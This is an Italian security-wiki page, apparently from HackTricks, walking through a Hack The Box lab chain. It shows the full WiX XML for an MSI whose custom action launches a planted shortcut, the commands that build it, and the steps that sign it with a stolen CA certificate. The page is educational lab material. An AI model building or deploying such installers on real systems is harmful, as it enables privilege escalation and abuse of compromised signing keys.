# Creazione di un MSI con Custom Action usando WiX

{{#include ../../banners/hacktricks-training.md}}

Questa catena storica di Hack The Box usava WiX Toolset v3 per creare un MSI che avviava un file `.lnk` precedentemente piantato. **Un MSI non dispone automaticamente di privilegi**: l'esecuzione avviene nel contesto determinato dai criteri di Windows Installer, dagli attributi della custom action e dall'utente che lo installa. Nello scenario citato, l'attacker aveva inoltre sottratto una CA di firma trusted e posizionato l'MSI firmato in una cartella monitorata da un altro utente.<sup>[[1]](#references)[[3]](#references)</sup>

Per una comprensione completa degli esempi di utilizzo di wix MSI, è consigliabile consultare [questa pagina](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Qui sono disponibili vari esempi che mostrano l'utilizzo di wix MSI.<sup>[[2]](#references)</sup>

L'MSI esegue `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. L'XML originale di WiX v3 è riportato di seguito:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` dichiara la versione minima di Windows Installer e `Compressed="yes"` indica che il pacchetto è compresso. `Stage1` è deferred ma ha `Impersonate="yes"`, quindi viene eseguito con il token impersonato dell'utente che esegue l'installazione; il cambio di privilegio in questo scenario è derivato dall'utente privilegiato che ha aperto successivamente l'MSI, non dal fatto che quell'attributo conceda magicamente i privilegi di SYSTEM.<sup>[[3]](#references)</sup>

Compila il sorgente in un oggetto WiX con `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Collega quell'oggetto a un MSI con `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Passaggio di signing usato nella chain originale

Il workflow di destinazione accettava pacchetti firmati da una CA interna compromessa. La relazione ricavava un certificato di firma da `MyCA.cer`/`MyCA.pvk`, creava un PFX e firmava l'MSI:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
L'attaccante ha quindi posizionato il package firmato in `D:\DEV\MSIs` e ha atteso che il workflow/utente privilegiato lo eseguisse. Mantieni questa precondizione quando adatti la tecnica: senza un percorso di installazione elevato, una policy non sicura come `AlwaysInstallElevated` o una vittima privilegiata, questo package viene eseguito solo con i diritti dell'utente corrente.

## References

- [1] [Hack The Box - Ethereal: Creazione di un msi malevolo e ottenimento di root - Blog di 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Una breve introduzione: creare un installer MSI con WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — custom actions a esecuzione differita (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
